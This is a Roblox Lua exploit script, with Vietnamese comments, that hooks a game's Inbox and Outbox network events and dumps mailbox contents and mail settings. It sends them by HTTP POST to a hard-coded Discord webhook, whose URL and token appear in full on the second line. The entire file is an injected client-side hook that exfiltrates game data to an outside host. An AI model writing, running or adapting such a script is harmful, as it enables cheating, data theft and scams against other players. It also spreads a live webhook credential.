-- Mailbox Reader v2 - Đọc đúng cấu trúc Inbox
local W="https://discord.com/api/webhooks/1502609152025952338/9TmUzZ2jRGfdu0tNYMz7lci6s42oYO1Pxj6MvlAU_x8qiMTxcU2awczwsHeYb3SaCDsD"
local Http=game:GetService("HttpService")
local RS=game:GetService("ReplicatedStorage")
local plr=game:GetService("Players").LocalPlayer
local Net=RS.Network

local function d(msg,c) pcall(function() request({Url=W,Method="POST",Headers={["Content-Type"]="application/json"},Body=Http:JSONEncode({embeds={{description=msg,color=c or 0x00ccff}}})}) end) wait(0.5) end

d("📬 **MAILBOX READER v2** | `"..plr.Name.."`", 0xffaa00)

local network = require(RS.Library.Client.Network)

local function dumpMail(mail, idx)
    if type(mail)~="table" then return end
    local lines={}
    for k,v in pairs(mail) do
        if type(v)=="table" then
            local sub={}
            for k2,v2 in pairs(v) do
                table.insert(sub, tostring(k2).."="..tostring(v2):sub(1,25))
                if #sub>=8 then table.insert(sub,"..."); break end
            end
            table.insert(lines, tostring(k).." = {"..table.concat(sub,", ").."}")
        else
            table.insert(lines, tostring(k).." = "..tostring(v):sub(1,50))
        end
    end
    d("📩 **Mail #"..idx..":**\n```\n"..table.concat(lines,"\n").."\n```", 0x00ccff)
end

local function processInboxData(data)
    if type(data)~="table" then return end
    -- Trường hợp data = {Inbox={...}, Settings={...}}
    local inbox = data.Inbox or data.inbox or data.Mails or data.mails
    if inbox then
        local cnt=0; for _ in pairs(inbox) do cnt=cnt+1 end
        d("📦 **"..cnt.." mails trong Inbox:**", 0x5599ff)
        local i=0
        for _,mail in pairs(inbox) do
            i=i+1
            dumpMail(mail, i)
            if i>=10 then break end
        end
    else
        -- data là inbox trực tiếp
        local cnt=0; for _ in pairs(data) do cnt=cnt+1 end
        if cnt>0 then
            d("📦 **"..cnt.." entries (direct):**", 0x5599ff)
            local i=0
            for k,mail in pairs(data) do
                i=i+1
                if type(mail)=="table" then
                    dumpMail(mail, i)
                end
                if i>=10 then break end
            end
        end
    end
end

-- Hook Inbox Updated với dump đúng cấu trúc
pcall(function()
    Net["Inbox Updated"].OnClientEvent:Connect(function(data)
        d("🔔 **Inbox Updated!**", 0x00ff88)
        processInboxData(data)
        -- Cũng dump Settings nếu có
        if type(data)=="table" and data.Settings then
            local s=data.Settings
            d("⚙️ **Settings:**\nEnabled="..tostring(s.Enabled)..
              " | RequiredPet="..tostring(s.RequiredPet)..
              " | RequiredDiamonds="..tostring(s.RequiredDiamonds)..
              " | HugesOnly="..tostring(s.HugesOnly)..
              " | FriendsOnly="..tostring(s.FriendsOnly), 0x9966ff)
        end
    end)
end)

-- Hook Outbox Updated
pcall(function()
    Net["Outbox Updated"].OnClientEvent:Connect(function(data)
        d("📤 **Outbox Updated!**", 0x5599ff)
        processInboxData(data)
    end)
end)

d("✅ **Hook active!**\n\nBây giờ **mở Hộp thư trong game** → Inbox Updated sẽ fire với full data", 0x00ff88)

while true do wait(60) end
